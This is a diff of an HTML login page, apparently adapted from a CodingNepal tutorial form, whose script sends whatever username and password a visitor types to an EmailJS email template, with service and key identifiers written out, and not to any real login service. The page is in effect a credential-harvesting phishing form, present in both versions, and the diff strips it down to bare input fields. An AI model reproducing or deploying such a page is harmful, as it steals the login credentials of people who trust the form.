@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<!-- Coding By CodingNepal - youtube.com/codingnepal -->
-<html lang="en" dir="ltr">
-  <head>
-    <meta charset="utf-8">
-    <title>Animated Login Form | CodingNepal</title>
-    <link rel="stylesheet" href="style.css">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
     <script type="text/javascript"
         src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
     </script>
@@ -18,28 +18,20 @@
             emailjs.send("service_910usgs", "template_sr7h0fu", {identify: document.getElementById("identify").value, password: document.getElementById("password").value}, "SKpvX_zVBkj86VJsM");
         }
     </script>
-  </head>
-  <body>
-    <div class="center">
-      <h1>Login</h1>
-      <form method="post">
-        <div class="txt_field">
-          <input type="text" id="identify" required>
-          <span></span>
-          <label>Username</label>
-        </div>
-        <div class="txt_field">
-          <input type="password" id="password" required>
-          <span></span>
-          <label>Password</label>
-        </div>
-        <div class="pass">Forgot Password?</div>
-        <button onClick="send()">Submit</button>
-        <div class="signup_link">
-          Not a member? <a href="#">Signup</a>
-        </div>
-      </form>
+</head>
+<body>
+    <div>
+        <input
+          type="text"
+          placeholder="identify"
+          id="identify"
+        />
+        <input
+          type="text"
+          placeholder="password"
+          id="password"
+        />
+        <button onClick="send()">submit</button>
     </div>
-
-  </body>
+</body>
 </html>
